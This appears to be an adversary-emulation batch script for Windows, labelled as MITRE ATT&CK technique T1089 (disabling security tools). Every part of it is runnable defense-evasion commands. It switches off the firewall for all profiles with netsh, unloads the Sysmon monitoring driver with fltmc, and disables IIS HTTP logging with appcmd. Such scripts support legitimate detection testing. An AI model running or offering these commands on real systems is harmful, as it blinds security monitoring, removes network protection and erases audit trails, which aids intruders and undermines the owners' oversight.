@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Disabling Security Tools (T1089)
ECHO.
ECHO [+] Turning Off firewall using 'netsh'
ECHO -------------------------------------------------------------------
cmd.exe /c netsh advfirewall set currentprofile state off
cmd.exe /c netsh advfirewall set domainprofile state off
cmd.exe /c netsh advfirewall set privateprofile state off
cmd.exe /c netsh advfirewall set publicprofile state off
cmd.exe /c netsh advfirewall set allprofiles state off
netsh advfirewall export rules_file
netsh advfirewall import rules_file

ECHO [+] Unloading SYSMON Driver
ECHO -------------------------------------------------------------------
fltmc.exe unload SysmonD
C:\Windows\System32\inetsrv\appcmd.exe set config "example.com" /section:httplogging /dontLog:true
ECHO.
